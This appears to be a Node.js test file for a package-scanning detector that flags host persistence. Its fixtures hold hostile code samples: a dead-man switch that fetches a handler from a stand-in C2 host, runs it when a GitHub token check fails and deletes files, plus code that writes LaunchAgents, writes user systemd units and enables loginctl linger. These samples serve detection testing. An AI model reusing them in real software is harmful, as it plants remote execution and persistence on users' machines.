import { test } from 'node:test';
import assert from 'assert/strict';
import { scan } from '../backend/detectors/tier1-host-persistence.js';
import { runAll } from '../backend/detectors/index.js';

const f = (path, content) => ({ path, content });
const types = (finding) => (finding?.detail || []).map((d) => d.type);
const PKG = (extra = {}) => ({ name: 'ui-toolkit', version: '1.0.0', ...extra });

test('D32: keyv-style dead-man switch is critical', () => {
  const code = [
    "const fs = require('fs');",
    "const { execSync } = require('child_process');",
    "const HANDLER = fetch('https://c2.example/handler').then(r => r.text());",
    'async function tick() {',
    "  const res = await fetch('https://api.github.com/user', { headers: { Authorization: 'token ' + process.env.GH_TOKEN } });",
    '  if (res.status >= 400) {',
    '    const h = await HANDLER;',
    '    execSync(h);',
    "    fs.rmSync(process.env.HOME + '/.config/gh-token-monitor', { recursive: true });",
    '    process.exit(0);',
    '  }',
    '}',
    'setInterval(tick, 60000);',
  ].join('\n');
  const findings = scan(PKG(), [], null, [f('lib/monitor.js', code)]);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].id, 'D32-HOST-PERSISTENCE');
  assert.equal(findings[0].severity, 'critical');
  assert.ok(types(findings[0]).includes('deadman_switch'));
});

test('D32: user LaunchAgent with autostart keys is critical', () => {
  const code = [
    "const fs = require('fs');",
    'const plist = \'<?xml version="1.0"?><plist><dict><key>RunAtLoad</key><true/><key>KeepAlive</key><true/></dict></plist>\';',
    "fs.writeFileSync(process.env.HOME + '/Library/LaunchAgents/com.user.updater.plist', plist);",
  ].join('\n');
  const findings = scan(PKG(), [], null, [f('index.js', code)]);
  assert.ok(types(findings[0]).includes('launch_agent_user'));
  assert.equal(findings[0].severity, 'critical');
});

test('D32: user-level systemd unit is flagged', () => {
  const code =
    "const fs=require('fs'); fs.writeFileSync(process.env.HOME+'/.config/systemd/user/keep.service', unit);";
  const findings = scan(PKG(), [], null, [f('setup.js', code)]);
  assert.ok(types(findings[0]).includes('systemd_user_unit'));
});

test('D32: loginctl enable-linger is flagged', () => {
  const code = "require('child_process').execSync('loginctl enable-linger ' + process.env.USER);";
  const findings = scan(PKG(), [], null, [f('persist.js', code)]);
  assert.ok(types(findings[0]).includes('loginctl_linger'));
});

/* False-positive controls */

test('D32: a code generator using new Function with no revocation check does not fire', () => {
  const code =
    "module.exports = function compile(tpl) { return new Function('with(o){return ' + tpl + '}'); };";
  const findings = scan(PKG(), [], null, [f('compiler.js', code)]);
  assert.deepEqual(findings, []);
});

test('D32: eval of a literal string does not fire', () => {
  const findings = scan(PKG(), [], null, [f('x.js', 'const v = eval("1+1"); module.exports = v;')]);
  assert.deepEqual(findings, []);
});

test('D32: system-level units (not user) are left to msh D2', () => {
  const code =
    "const { execSync } = require('child_process'); execSync('crontab -e'); require('fs').writeFileSync('/etc/systemd/system/svc.service', s);";
  const findings = scan(PKG(), [], null, [f('install.js', code)]);
  assert.deepEqual(findings, []);
});

test('D32: reputable packages are exempt', () => {
  const code =
    "require('fs').writeFileSync(process.env.HOME + '/Library/LaunchAgents/a.plist', p);";
  assert.deepEqual(scan({ name: 'react', version: '18.0.0' }, [], null, [f('i.js', code)]), []);
});

test('D32: finding matches the standard tier-1 shape', () => {
  const code =
    "const fs=require('fs'); fs.writeFileSync(process.env.HOME+'/.config/systemd/user/m.service', u);";
  const [finding] = scan(PKG(), [], null, [f('s.js', code)]);
  assert.equal(finding.detector, 'tier1-host-persistence');
  assert.ok(['low', 'medium', 'high', 'critical'].includes(finding.severity));
  assert.ok(Array.isArray(finding.evidence));
  assert.ok(finding.locations.every((l) => typeof l.file === 'string' && l.line >= 1));
});

test('D32: surfaced through the full detector pipeline', async () => {
  const code =
    "require('child_process').execSync('loginctl enable-linger'); require('fs').writeFileSync(process.env.HOME+'/.config/systemd/user/x.service', u);";
  const files = [f('p.js', code)];
  const findings = await runAll(PKG(), files, null, files);
  assert.ok(findings.some((x) => x.id === 'D32-HOST-PERSISTENCE'));
});
